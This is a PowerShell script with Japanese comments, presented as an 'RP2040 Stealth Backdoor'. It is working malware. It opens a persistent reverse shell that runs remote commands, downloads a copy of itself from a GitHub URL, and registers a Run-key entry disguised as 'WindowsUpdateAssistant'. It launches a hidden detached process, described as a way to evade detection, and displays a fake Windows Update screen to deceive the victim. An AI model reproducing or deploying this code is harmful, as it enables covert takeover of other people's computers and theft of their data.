# --- RP2040 Stealth Backdoor (Initial-Based Fix) ---
# 最初のコードをベースに、ターミナルが閉じられても通信が切れないように修正しました。

function Start-ReverseShell {
    param(
        [string]$LHOST = "127.0.0.1",
        [int]$LPORT = 4444,
        [switch]$Background
    )

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    # --- バックグラウンドモード（本体） ---
    if ($Background) {
        while ($true) {
            try {
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)

                $Writer.WriteLine("--- RP2040 Background Session Established ---")
                $Writer.Write("PS " + (Get-Location).Path + "> ")

                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        try {
                            $Result = Invoke-Expression $Command 2>&1 | Out-String
                        } catch {
                            $Result = $_.Exception.Message
                        }
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
                $TCPClient.Close()
            } catch {
                # 接続失敗時は30秒待機してリトライ
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # --- メインモード（可視ターミナル） ---

    # 自身の保存
    if (-not (Test-Path $DestPath)) {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
    }

    # 永続化（再起動後も自動実行。ここでは念のため可視モードのまま登録）
    $RegCommand = "powershell.exe -ExecutionPolicy Bypass -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT`""
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand

    # ★重要：バックグラウンドプロセスを「切り離して」起動★
    # これにより、現在のターミナルを閉じても通信プロセスは死にません。
    $LaunchArgs = "-ExecutionPolicy Bypass -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background`""
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        # 0 = 非表示, $false = 終了を待たない（独立）
        $WshShell.Run("powershell.exe $LaunchArgs", 0, $false)
    } catch {
        # フォールバック（これだと閉じたら死ぬ可能性が高いが検知は回避できる）
        Start-Process powershell.exe -ArgumentList $LaunchArgs -WindowStyle Hidden
    }

    # デコイ画面（ユーザーに見せるダミーのメッセージ）
    Clear-Host
    Write-Host "Windows Update Assistant" -ForegroundColor Cyan
    Write-Host "Searching for system updates..."
    Start-Sleep -Seconds 5
    Write-Host "No critical updates found. Your system is up to date." -ForegroundColor Green
    Write-Host "Monitoring system stability in background. You may close this window."
    
    # ウィンドウを表示し続ける（ユーザーに閉じてもらうまで待つ）
    while($true) { Start-Sleep -Seconds 60 }
}
